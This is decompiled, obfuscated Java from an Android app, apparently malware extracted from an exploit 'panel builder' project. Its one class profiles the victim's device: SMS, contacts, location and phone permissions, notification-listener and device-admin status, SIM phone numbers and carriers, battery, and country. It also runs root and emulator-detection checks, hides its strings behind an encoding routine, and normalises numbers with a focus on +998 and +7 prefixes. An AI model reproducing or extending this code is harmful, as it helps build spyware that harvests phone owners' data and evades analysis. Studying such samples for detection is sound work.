package v.s;

import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.Context;
import android.os.BatteryManager;
import android.os.Build;
import android.provider.Settings;
import android.telephony.SubscriptionInfo;
import android.telephony.SubscriptionManager;
import android.telephony.TelephonyManager;
import app.mobilex.plus.receivers.DeviceAdminReceiver;
import app.mobilex.plus.services.DataQFAdapter;
import app.mobilex.plus.util.ProviderJUAdapter;
import app.mobilex.plus.util.TypefaceCache;
import java.io.File;
import java.util.ArrayList;
import java.util.List;
import java.util.Locale;
import java.util.regex.Pattern;

/* JADX INFO: compiled from: r8-map-id-15e63fcf80fafdb0de787d7190aafb45897c9495c974dfb43163f91afee6c091 */
/* JADX INFO: loaded from: /private/tmp/claude-501/-Users-noiss-Work-exploit-RedWing-Panel-main-source-internal-builder/68c7750b-b3a0-412f-ab12-bf16e4a764d8/scratchpad/dex_extract/classes.dex */
public abstract class Qo5pgXlTLQld {
    static {
        TypefaceCache.obtain("00160066005F008600E400BA00FB0080001300640054008400F500AC00C100A80031");
    }

    /* JADX WARN: Code duplicated, block: B:216:0x0480  */
    /* JADX WARN: Code duplicated, block: B:218:0x048e  */
    /* JADX WARN: Code duplicated, block: B:94:0x0171  */
    /* JADX WARN: Multi-variable type inference failed */
    public static rKX6cSz43EQ3nFJKyF dDIMxZXP1V8HdM(Context context) {
        boolean z;
        int intProperty;
        String str;
        String str2;
        String str3;
        String str4;
        String[] strArr;
        int i;
        boolean z2;
        boolean zIm;
        boolean z3;
        String str5;
        String str6;
        String networkCountryIso;
        String networkOperatorName;
        String line1Number;
        String string;
        Object systemService = context.getSystemService("phone");
        TelephonyManager telephonyManager = systemService instanceof TelephonyManager ? (TelephonyManager) systemService : null;
        int i2 = 48 - 47;
        boolean z4 = RIZfHbqXpth8r2yN4.vekpFI4d1Nc4fakF(context, "android.permission.READ_SMS") == 0 ? i2 : 0;
        boolean z5 = RIZfHbqXpth8r2yN4.vekpFI4d1Nc4fakF(context, "android.permission.READ_PHONE_STATE") == 0 ? i2 : 0;
        boolean z6 = RIZfHbqXpth8r2yN4.vekpFI4d1Nc4fakF(context, "android.permission.READ_CONTACTS") == 0 ? i2 : 0;
        boolean z7 = (RIZfHbqXpth8r2yN4.vekpFI4d1Nc4fakF(context, "android.permission.ACCESS_FINE_LOCATION") == 0 || RIZfHbqXpth8r2yN4.vekpFI4d1Nc4fakF(context, "android.permission.ACCESS_COARSE_LOCATION") == 0) ? i2 : 0;
        boolean zDDIMxZXP1V8HdM = Build.VERSION.SDK_INT >= 33 ? RIZfHbqXpth8r2yN4.vekpFI4d1Nc4fakF(context, "android.permission.POST_NOTIFICATIONS") == 0 ? i2 : 0 : w8yTgA6o8BqtcHazpDd.dDIMxZXP1V8HdM(new HEqPccX85NcWnm0(context).w9sT1Swbhx3hs);
        String packageName = context.getPackageName();
        String string2 = Settings.Secure.getString(context.getContentResolver(), TypefaceCache.obtain("00260078005A008500FC00BA00D60098002D0079004F008E00F600B600D100A60037007F0054008900CF00B300DB00B4003700730055008200E200AC"));
        boolean z8 = (string2 == null || !KgSM0TsKUpCiuePB.VEkRsTDS6a9oHWI(string2, packageName, false)) ? 0 : i2;
        DataQFAdapter.Companion.getClass();
        boolean zK7eEOBPYP9VIoHWTe = GARjgaGEpTotOxcl8vfe.K7eEOBPYP9VIoHWTe(context);
        try {
            Object systemService2 = context.getSystemService("device_policy");
            DevicePolicyManager devicePolicyManager = systemService2 instanceof DevicePolicyManager ? (DevicePolicyManager) systemService2 : null;
            z = (devicePolicyManager == null || devicePolicyManager.isAdminActive(new ComponentName(context, (Class<?>) DeviceAdminReceiver.class)) != i2) ? 0 : i2;
        } catch (Exception unused) {
        }
        try {
            intProperty = ((BatteryManager) context.getSystemService("batterymanager")).getIntProperty(4);
        } catch (Exception unused2) {
            intProperty = (-65) + 64;
        }
        int i3 = intProperty;
        try {
            Object systemService3 = context.getSystemService("telephony_subscription_service");
            SubscriptionManager subscriptionManager = systemService3 instanceof SubscriptionManager ? (SubscriptionManager) systemService3 : null;
            if (RIZfHbqXpth8r2yN4.vekpFI4d1Nc4fakF(context, "android.permission.READ_PHONE_STATE") != 0) {
                str = null;
                str2 = null;
                str3 = null;
                str4 = null;
            } else {
                List<SubscriptionInfo> activeSubscriptionInfoList = subscriptionManager != null ? subscriptionManager.getActiveSubscriptionInfoList() : null;
                if (activeSubscriptionInfoList != null) {
                    str = null;
                    str2 = null;
                    str3 = null;
                    str4 = null;
                    int i4 = 0;
                    for (Object obj : activeSubscriptionInfoList) {
                        try {
                            int i5 = i4 + 1;
                            if (i4 < 0) {
                                Aqh0grSwgDbwr.O2DHNSIGZlgPja7eqLgn();
                                throw null;
                            }
                            SubscriptionInfo subscriptionInfo = (SubscriptionInfo) obj;
                            String number = subscriptionInfo.getNumber();
                            if (number == null || BS2kx9eAoOyDiNGAFlFk.euF5Udt5Rqv3Qmea(number)) {
                                number = null;
                            }
                            CharSequence carrierName = subscriptionInfo.getCarrierName();
                            if (carrierName == null || (string = carrierName.toString()) == null || BS2kx9eAoOyDiNGAFlFk.euF5Udt5Rqv3Qmea(string)) {
                                string = null;
                            }
                            if (i4 == 0) {
                                str2 = string;
                                str = number;
                            } else if (i4 == i2) {
                                str4 = string;
                                str3 = number;
                            }
                            i4 = i5;
                        } catch (Exception e) {
                            e = e;
                            TypefaceCache.obtain("00240073004F00A300E500BE00DE0094002A007B0072008900F600B0009200A2003100640054009500AA00FF");
                            e.getMessage();
                        }
                    }
                } else {
                    str = null;
                    str2 = null;
                    str3 = null;
                    str4 = null;
                }
            }
            if (str == null) {
                Object systemService4 = context.getSystemService("phone");
                TelephonyManager telephonyManager2 = systemService4 instanceof TelephonyManager ? (TelephonyManager) systemService4 : null;
                if (RIZfHbqXpth8r2yN4.vekpFI4d1Nc4fakF(context, "android.permission.READ_PHONE_NUMBERS") == 0 || RIZfHbqXpth8r2yN4.vekpFI4d1Nc4fakF(context, "android.permission.READ_PHONE_STATE") == 0) {
                    if (telephonyManager2 == null || (line1Number = telephonyManager2.getLine1Number()) == null || BS2kx9eAoOyDiNGAFlFk.euF5Udt5Rqv3Qmea(line1Number)) {
                        line1Number = null;
                    }
                    str = line1Number;
                }
                if (str2 == null) {
                    str2 = (telephonyManager2 == null || (networkOperatorName = telephonyManager2.getNetworkOperatorName()) == null || BS2kx9eAoOyDiNGAFlFk.euF5Udt5Rqv3Qmea(networkOperatorName)) ? null : networkOperatorName;
                }
            }
            while (true) {
                if (i >= 6) {
                    z2 = false;
                    break;
                }
                if (new File(strArr[i]).exists()) {
                    z2 = true;
                    break;
                }
                i++;
                i2 = (-59) + 60;
            }
        } catch (Exception e2) {
            e = e2;
            str = null;
            str2 = null;
            str3 = null;
            str4 = null;
        }
        String str7 = str3;
        String str8 = str4;
        String str9 = str2;
        String strW9sT1Swbhx3hs = w9sT1Swbhx3hs(str);
        String strW9sT1Swbhx3hs2 = w9sT1Swbhx3hs(str7);
        String str10 = Build.MODEL;
        String str11 = Build.MANUFACTURER;
        String str12 = Build.VERSION.RELEASE;
        int i6 = Build.VERSION.SDK_INT;
        String upperCase = (telephonyManager == null || (networkCountryIso = telephonyManager.getNetworkCountryIso()) == null) ? null : networkCountryIso.toUpperCase(Locale.ROOT);
        strArr = new String[]{TypefaceCache.obtain("006C00650042009400E400BA00DF00E800220066004B00C800C300AA00C200A2003100630048008200E200F100D300B70028"), TypefaceCache.obtain("006C00650042009400E400BA00DF00E8003B00740052008900BF00AC00C7"), TypefaceCache.obtain("006C00650042009400E400BA00DF00E80021007F005500C800E300AA"), TypefaceCache.obtain("006C00650059008E00FE00F000C100B2"), TypefaceCache.obtain("006C0072005A009300F100F000DE00A800200077005700C800E800BD00DB00A9006C0065004E"), TypefaceCache.obtain("006C0072005A009300F100F000DE00A800200077005700C800F200B600DC00E800300063")};
        i = 0;
        ArrayList arrayList = new ArrayList();
        String str13 = Build.FINGERPRINT;
        Locale locale = Locale.ROOT;
        String lowerCase = str13.toLowerCase(locale);
        String lowerCase2 = Build.MODEL.toLowerCase(locale);
        String lowerCase3 = Build.HARDWARE.toLowerCase(locale);
        String lowerCase4 = Build.PRODUCT.toLowerCase(locale);
        String lowerCase5 = Build.MANUFACTURER.toLowerCase(locale);
        String lowerCase6 = Build.BRAND.toLowerCase(locale);
        String lowerCase7 = Build.DEVICE.toLowerCase(locale);
        String lowerCase8 = Build.BOARD.toLowerCase(locale);
        if (KgSM0TsKUpCiuePB.VEkRsTDS6a9oHWI(lowerCase2, TypefaceCache.obtain("002400790054008000FC00BA00ED00B40027007D"), false)) {
            arrayList.add(TypefaceCache.obtain("002E0079005F008200FC00E500D500A8002C00710057008200CF00AC00D600AC"));
        }
        if (KgSM0TsKUpCiuePB.VEkRsTDS6a9oHWI(lowerCase2, TypefaceCache.obtain("0026007B004E008B00F100AB00DD00B5"), false)) {
            arrayList.add(TypefaceCache.obtain("002E0079005F008200FC00E500D700AA0036007A005A009300FF00AD"));
        }
        if (KgSM0TsKUpCiuePB.VEkRsTDS6a9oHWI(lowerCase2, TypefaceCache.obtain("00220078005F009500FF00B600D600E7003000720050"), false)) {
            arrayList.add(TypefaceCache.obtain("002E0079005F008200FC00E500D300A9002700640054008E00F4008000C100A30028"));
        }
        if (KgSM0TsKUpCiuePB.VEkRsTDS6a9oHWI(lowerCase5, TypefaceCache.obtain("002400730055009E00FD00B000C600AE002C0078"), false)) {
            arrayList.add(TypefaceCache.obtain("002E0070004900DD00F700BA00DC00BE002E0079004F008E00FF00B1"));
        }
        if (KgSM0TsKUpCiuePB.VEkRsTDS6a9oHWI(lowerCase3, TypefaceCache.obtain("002400790057008300F600B600C100AF"), false)) {
            arrayList.add(TypefaceCache.obtain("002B00610001008000FF00B300D600A1002A00650053"));
        }
        if (KgSM0TsKUpCiuePB.VEkRsTDS6a9oHWI(lowerCase3, TypefaceCache.obtain("003100770055008400F800AA"), false)) {
            arrayList.add(TypefaceCache.obtain("002B00610001009500F100B100D100AF0036"));
        }
        if (KgSM0TsKUpCiuePB.VEkRsTDS6a9oHWI(lowerCase4, TypefaceCache.obtain("003500740054009F"), false)) {
            arrayList.add(TypefaceCache.obtain("003300640054008300AA00A900D000A8003B"));
        }
        if (KgSM0TsKUpCiuePB.VEkRsTDS6a9oHWI(lowerCase3, TypefaceCache.obtain("002D00790043"), false)) {
            arrayList.add(TypefaceCache.obtain("002B00610001008900FF00A7"));
        }
        if (KgSM0TsKUpCiuePB.VEkRsTDS6a9oHWI(lowerCase4, TypefaceCache.obtain("002D00790043"), false)) {
            arrayList.add(TypefaceCache.obtain("003300640054008300AA00B100DD00BF"));
        }
        if (KgSM0TsKUpCiuePB.VEkRsTDS6a9oHWI(lowerCase5, TypefaceCache.obtain("0037007F005A008900E400B600D300A90035007B"), false)) {
            arrayList.add(TypefaceCache.obtain("002E0070004900DD00E400B600D300A90037007F005A008900E600B2"));
        }
        if (KgSM0TsKUpCiuePB.VEkRsTDS6a9oHWI(lowerCase, TypefaceCache.obtain("00370062004D008A00CF00B700D600B50022007100540089"), false)) {
            arrayList.add(TypefaceCache.obtain("002500660001009300E400A900DF"));
        }
        if (KgSM0TsKUpCiuePB.VEkRsTDS6a9oHWI(lowerCase8, TypefaceCache.obtain("002D00790043"), false)) {
            arrayList.add(TypefaceCache.obtain("00210079005A009500F400E500DC00A8003B"));
        }
        try {
            if (!arrayList.isEmpty()) {
                TypefaceCache.obtain("002100630052008B00F400E5");
                imhBI9RqzETHtVIJe.euF5Udt5Rqv3Qmea(arrayList, ",", null, 62);
            } else if (lowerCase6.equals(TypefaceCache.obtain("002400730055008200E200B600D1")) && lowerCase7.equals(TypefaceCache.obtain("002400730055008200E200B600D1"))) {
                TypefaceCache.obtain("002400730055008200E200B600D1009800210064005A008900F4008000D600A20035007F00580082");
            } else if (KgSM0TsKUpCiuePB.VEkRsTDS6a9oHWI(lowerCase, TypefaceCache.obtain("002400730055008200E200B600D1"), false) && (lowerCase4.startsWith(TypefaceCache.obtain("003000720050")) || lowerCase6.equals(TypefaceCache.obtain("002400730055008200E200B600D1")) || lowerCase5.equals(TypefaceCache.obtain("003600780050008900FF00A800DC")))) {
                TypefaceCache.obtain("002500660064008000F500B100D700B5002A00750010");
                if (!lowerCase4.startsWith("sdk")) {
                    lowerCase6.equals("generic");
                }
            } else {
                if (!lowerCase4.equals(TypefaceCache.obtain("003000720050")) && !lowerCase4.equals(TypefaceCache.obtain("00300072005000B800E800E70084")) && !lowerCase4.equals(TypefaceCache.obtain("00300072005000B800E800E70084009800750022")) && !lowerCase4.startsWith(TypefaceCache.obtain("00300072005000B800F700AF00DA00A8002D0073")) && !lowerCase4.startsWith(TypefaceCache.obtain("00300072005000B800F700BA00DF00B2"))) {
                    try {
                        zIm = ProviderJUAdapter.im();
                    } catch (Throwable unused3) {
                        zIm = false;
                    }
                    if (!zIm) {
                        try {
                            TypefaceCache.obtain("00260078004D00B800E300B700DD00B2002F00720069009200FE00E200D400A6002F0065005E");
                        } catch (Throwable unused4) {
                            z3 = false;
                        }
                    }
                    z3 = false;
                    str6 = context.getPackageManager().getPackageInfo(context.getPackageName(), 0).versionName;
                    if (str6 == null) {
                        str5 = "1.0";
                    } else {
                        str5 = str6;
                    }
                    return new rKX6cSz43EQ3nFJKyF(i6, strW9sT1Swbhx3hs, str9, strW9sT1Swbhx3hs2, str8, upperCase, z4, zDDIMxZXP1V8HdM, z8, z6, z5, z7, zK7eEOBPYP9VIoHWTe, z, z2, z3, str5, i3);
                }
                TypefaceCache.obtain("003300640054008300AA");
            }
            str6 = context.getPackageManager().getPackageInfo(context.getPackageName(), 0).versionName;
            if (str6 == null) {
                str5 = "1.0";
            } else {
                str5 = str6;
            }
        } catch (Exception unused5) {
        }
        z3 = true;
        return new rKX6cSz43EQ3nFJKyF(i6, strW9sT1Swbhx3hs, str9, strW9sT1Swbhx3hs2, str8, upperCase, z4, zDDIMxZXP1V8HdM, z8, z6, z5, z7, zK7eEOBPYP9VIoHWTe, z, z2, z3, str5, i3);
    }

    public static String w9sT1Swbhx3hs(String str) {
        if (str == null || BS2kx9eAoOyDiNGAFlFk.euF5Udt5Rqv3Qmea(str)) {
            return null;
        }
        String strReplaceAll = Pattern.compile(TypefaceCache.obtain("0018004A004800BB00BD00F7009B009A")).matcher(str).replaceAll("");
        String strReplaceAll2 = Pattern.compile(TypefaceCache.obtain("001800480067008300CD")).matcher(strReplaceAll).replaceAll("");
        if (strReplaceAll2.length() < 7 || strReplaceAll2.length() > 15) {
            return null;
        }
        if (!strReplaceAll.startsWith("+")) {
            if (strReplaceAll2.startsWith("998") && strReplaceAll2.length() == 12) {
                strReplaceAll = "+".concat(strReplaceAll2);
            } else if (strReplaceAll2.startsWith("7") && strReplaceAll2.length() == 11) {
                strReplaceAll = "+".concat(strReplaceAll2);
            } else if (strReplaceAll2.startsWith("8") && strReplaceAll2.length() == 11) {
                strReplaceAll = "+7".concat(strReplaceAll2.substring(1));
            } else {
                strReplaceAll = strReplaceAll2.length() == 62 + (-52) ? "+7".concat(strReplaceAll2) : "+".concat(strReplaceAll2);
            }
        }
        if (Pattern.compile("^\\+[1-9]\\d{6,14}$").matcher(strReplaceAll).matches()) {
            return strReplaceAll;
        }
        return null;
    }
}
